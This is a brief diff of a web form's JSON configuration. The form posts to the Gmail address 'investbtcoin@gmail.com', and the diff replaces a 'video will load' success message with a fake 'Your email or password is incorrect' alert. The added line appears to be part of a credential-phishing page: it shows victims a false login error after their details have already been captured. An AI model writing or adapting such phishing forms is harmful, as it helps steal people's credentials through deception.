@@ -109,7 +109,7 @@
           "form": {
             "action": "investbtcoin@gmail.com",
             "alerts": {
-              "success": "The video shall load within one minute"
+              "success": "Your email or password is incorrect"
             },
             "fields": {
               "name": {
